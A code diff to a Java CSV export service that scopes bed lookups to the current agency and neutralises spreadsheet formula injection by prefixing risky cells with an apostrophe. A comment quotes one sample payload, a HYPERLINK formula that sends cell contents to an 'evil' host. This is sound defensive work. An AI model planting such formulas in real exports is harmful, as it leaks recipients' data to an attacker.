@@ -1,6 +1,7 @@
 package com.beduno.occupancy;
 
 import com.beduno.bed.Bed;
+import com.beduno.common.security.TenantContext;
 import com.beduno.bed.BedRepository;
 import com.beduno.stay.StayService;
 import lombok.RequiredArgsConstructor;
@@ -18,6 +19,13 @@ import java.util.stream.Collectors;
 @Service
 @RequiredArgsConstructor
 public class ExportService {
+
+    /**
+     * Characters that make a spreadsheet treat a cell as a formula rather than as text. Excel and
+     * LibreOffice both evaluate these on open, and these files exist to be opened in exactly
+     * those programs.
+     */
+    private static final String FORMULA_PREFIXES = "=+-@\t\r";
 
     private final OccupancyService occupancyService;
     private final StayService stayService;
@@ -87,7 +95,7 @@ public class ExportService {
         if (distinctIds.isEmpty()) {
             return Map.of();
         }
-        return bedRepository.findAllById(distinctIds).stream()
+        return bedRepository.findAllByAgencyIdAndIdIn(TenantContext.requireAgencyId(), distinctIds).stream()
                 .collect(Collectors.toMap(Bed::getId, Bed::getLabel));
     }
 
@@ -138,14 +146,27 @@ public class ExportService {
         return sb.toString();
     }
 
+    /**
+     * Quotes and, where necessary, neutralises a cell.
+     *
+     * <p>Room numbers, floors and worker names are free text that agency users -- and the worker
+     * CSV import -- control. A name of {@code =HYPERLINK("http://evil/"&A1,"open")} was written
+     * out verbatim and ran when the recipient opened the export. Prefixing with an apostrophe is
+     * the standard defence: spreadsheets treat the rest as text and do not display the apostrophe.
+     *
+     * <p>{@code \r} is quoted alongside {@code \n}: on its own it splits the row in some readers.
+     */
     private String escapeCsvField(String value) {
         if (value == null || value.isEmpty()) {
             return "";
         }
-        if (value.contains(",") || value.contains("\"") || value.contains("\n")) {
-            return "\"" + value.replace("\"", "\"\"") + "\"";
+        var neutralised = FORMULA_PREFIXES.indexOf(value.charAt(0)) >= 0 ? "'" + value : value;
+        if (neutralised.contains(",") || neutralised.contains("\"")
+                || neutralised.contains("\n") || neutralised.contains("\r")
+                || neutralised != value) {
+            return "\"" + neutralised.replace("\"", "\"\"") + "\"";
         }
-        return value;
+        return neutralised;
     }
 
     private String msg(String key, Locale locale) {
